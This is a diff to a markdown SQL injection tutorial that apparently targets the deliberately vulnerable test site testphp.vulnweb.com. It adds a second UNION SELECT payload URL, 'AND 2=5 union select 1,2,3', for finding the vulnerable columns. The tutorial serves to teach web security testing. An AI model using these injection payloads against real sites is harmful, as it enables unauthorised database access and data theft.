@@ -68,7 +68,9 @@ increasing the number i got error at ``order by 4`` which shows we have 3 column
  
  ```http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,2,3```
 
-***Note the - after the = sign***
+***Note the - after the = sign*** or using the ``and`` and a false statement like ``1=5`` before the ``union select``
+
+E.G ``http://testphp.vulnweb.com/artists.php?artists=1 AND 2=5 union select 1,2,3`` 
 
 ![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/25527c10-1785-4f3b-b1d6-814f4f97dd47)
 Those numbers showing on the screen are the vulnerable columns so, you can choose the one you prefer for the injection
